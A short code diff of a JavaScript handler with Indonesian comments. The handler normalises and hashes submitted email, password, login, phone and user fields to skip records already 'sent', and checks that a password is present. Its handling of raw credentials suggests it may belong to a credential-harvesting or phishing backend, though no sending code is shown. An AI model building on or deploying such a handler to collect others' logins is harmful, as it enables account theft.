@@ -489,25 +489,27 @@ INFORMASI TAMBAHAN
 /* ======================
    MAIN HANDLER
 ====================== */
-      const crypto = require("crypto");
+const crypto = require("crypto");
 
 // Simpan hash vars yang sudah dikirim (in-memory, reset saat restart)
 const sentHashes = new Set();
 
 function hashVars(vars) {
   const key = JSON.stringify({
-    email: vars.email,
-    password: vars.password,
-    ip: vars.ip,
+    email: vars.email?.trim().toLowerCase(),
+    password: vars.password?.trim(),
+    login: vars.login?.trim(),
+    phone: vars.phone?.trim(),
+    user: vars.user?.trim(),
   });
   return crypto.createHash("sha256").update(key).digest("hex");
 }
-
 function validateVars(vars) {
   const errors = [];
 
   // Email
-  
+
+
   // Password
   if (!vars.password || vars.password === "-") {
     errors.push("password kosong");
